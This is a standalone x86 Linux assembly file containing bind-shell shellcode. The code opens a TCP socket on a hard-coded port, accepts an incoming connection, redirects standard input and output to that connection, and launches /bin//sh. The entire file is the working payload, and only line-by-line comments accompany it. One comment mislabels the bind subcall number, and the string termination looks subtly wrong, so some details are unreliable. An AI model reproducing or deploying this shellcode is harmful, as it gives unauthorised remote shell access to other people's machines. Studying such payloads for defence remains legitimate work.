BITS 32


; socket()
xor		eax,eax		; zero out eax
xor		ebx,ebx		;   "   "  ebx
push		eax		; push 0x0 on the stack: arg3(protocol) -> 0
mov		bl,0x1		; socket sub-syscall: 0x01 -> socket()
push		ebx		; socket type: 0x01 -> SOCK_STREAM
push		0x02		; socket domain: 0x02 -> AF_INET
mov		ecx,esp		; let ecx point to our structure above
mov		al,0x66		; socketcall syscall 0x66
int		0x80		; let the kernel do the stuff

; bind()
mov		edx,eax		; move socket descriptor (returned by socket()) to edx
xor		eax,eax
; sockaddr_in
push		eax		; sockaddr_in: in_addr = 0
push word	0x11AA		; sockaddr_in: tcp port 
push word 	0x2		; sockaddr_in: sa_family -> AF_INET = 0x2
mov		ecx,esp		; save stack pointer -> pointer to sockaddr struct
push		0x10		; arg3: socklen -> addrlen
push		ecx		; arg2: push pointer to sockaddr to the stack
push		edx		; arg1: push sockfd
; arg2
mov		ecx,esp		; move stack pointer to reg (conform to socketcall)
; arg1
xor		ebx,ebx
mov		bl,0x2		; set socket subcall to 0x03 (bind)
mov		al,0x66		; socketcall syscall
int		0x80		; let the kernel do the stuff

; listen()
xor		eax,eax
push		eax		; backlog
push		edx		; sockfd
mov		ecx,esp		; save stackptr
mov		al,0x66		; socketcall()
xor		ebx,ebx
mov		bl,0x4		; socketcall 0x4 -> listen()
int		0x80		; kernel mode

; accept()
xor		eax,eax
push		eax		; sockaddr: in_addr = 0
push word	ax		; sockaddr: tcp port = 0
push word	0x2		; sockaddr: sa_family -> AF_INET
mov		ecx,esp		; save stack pointer
push		0x10		; addrlen
push		esp		; pointer to sock addrlen
push 		ecx		; push sockaddr_in
push		edx		; sockfd
mov		ecx,esp
xor		ebx,ebx
mov		bl,0x5
mov		al,0x66
int		0x80

; dup2()
xor		ecx,ecx		; zero out count register
mov		cl,0x3		; loopcount
mov		ebx,eax		; sockfd of the client (see accept())
dupes:
xor		eax,eax		; zero out eax
mov		al,63		; dup2() syscall
dec		cl
int		0x80
inc		cl
loop		dupes		; jump2label

; exec()
xor		eax,eax
xor		ecx,ecx
cdq
push		0x68732f6e	; 'hs/n'
push		0x69622f2f	; 'ib//'
mov		ebx,esp		; arg
mov byte	[esp + 8], al	; null-terminate the string
mov		al,0xb		; execve syscall
int		0x80

; exit()
mov		al,0x1		; exit syscall
xor		ebx,ebx
mov		bl,0x42		; return code
int		0x80		; kernel mode
